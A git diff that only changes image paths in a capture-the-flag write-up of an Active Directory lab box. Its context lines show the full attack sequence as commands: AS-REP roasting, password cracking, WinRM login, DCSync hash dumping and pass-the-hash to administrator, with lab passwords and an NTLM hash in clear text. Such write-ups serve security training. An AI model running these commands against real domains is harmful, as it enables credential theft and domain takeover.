@@ -15,13 +15,13 @@ I begin an active scanning on target ip to find open ports. I used multiple tool
 rustscan -a $target-ip
 ```
 
-<figure><img src=".gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 nmap -sC -sV -p- -Pn $target-ip
 ```
 
-<figure><img src=".gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Services Enumeration
 
@@ -31,7 +31,7 @@ Nothing much here. SMB service is not really useful, signing enabled and require
 
 After dive deep into target website, I find out the list of staff with probability high privileges to the system. I decided to use this information to craft a wordlist of usernames and then try it on target open services.
 
-<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Users Enumeration
 
@@ -50,9 +50,9 @@ I crafted wordlist of usernames with commonly used pattern using [username-anarc
 netexec ldap $dc-ip -u username_wordlist -p '' --asreproast asreproast_output
 ```
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Password Cracking
 
@@ -62,9 +62,9 @@ Based on NTLM hash we got from NXC. I stored it in the file called `fsmith_passh
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt fsmith_passhash
 ```
 
-<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Gaining Access
 
@@ -78,7 +78,7 @@ I can leverage this credential on other services, the most prominent service to 
 evil-winrm -i $target-ip -u fsmith -p 'Thestrokes23'
 ```
 
-<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Luckily, We got the flag for user.
 
@@ -102,13 +102,13 @@ ls
 /WinPeas.exe domain
 ```
 
-<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 After **A LONGGG LONGGG** review of WinPEAS Result, I discovered domain service account cred.
 
 `svc_loanmanager:Moneymakestheworldgoround!`&#x20;
 
-<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can utilized this cred to gain more information.
 
@@ -122,15 +122,15 @@ I utilized Bloodhound via NXC
 nxc ldap $dc-ip -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' --bloodhound -c All --dns-server $dc-ip
 ```
 
-<figure><img src=".gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once the command is executed. A zip file is created containing JSON files of OUs, groups, domains and etc.
 
-<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 With this JSON files, I can determine path to gain higher privilege. I used Bloodhound to ingest data and graph the path. From what have I analyze on relation in and out from SVC\_LOANMGR. I discovered a misconfiguration and possible exploit via DCSync using DCSync Attack.
 
-<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 > _What Are DCSync Attacks?_
 >
@@ -146,7 +146,7 @@ I used impacket-secretdump to dump domain users and password hashes. As a result
 impacket-secretsdump 'egotistical-bank/svc_loanmgr':'Moneymakestheworldgoround!'@$dc-ip
 ```
 
-<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Privilege Escalation Gain Access
 
@@ -156,7 +156,7 @@ Once I have the hash of administrator. I used [Pass-The-Hash](https://www.crowds
 impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' 'egotistical-bank/administrator@$target-ip'
 ```
 
-<figure><img src=".gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Admin Data Discovery and Collection
 
@@ -170,4 +170,4 @@ dir
 type root.txt
 ```
 
-<figure><img src=".gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
